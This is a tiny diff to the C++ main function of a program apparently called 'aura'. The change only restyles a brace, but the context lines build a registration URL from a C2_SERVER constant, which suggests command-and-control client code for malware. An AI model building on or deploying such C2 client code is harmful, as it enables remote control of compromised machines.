@@ -5,8 +5,7 @@
 #include <iostream>
 #include "aura.hh"
 
-int main()
-{
+int main() {
 	std::string registerUrl, cmdUrl, seedPath;
 
 	registerUrl = C2_SERVER + REGISTER_URI;
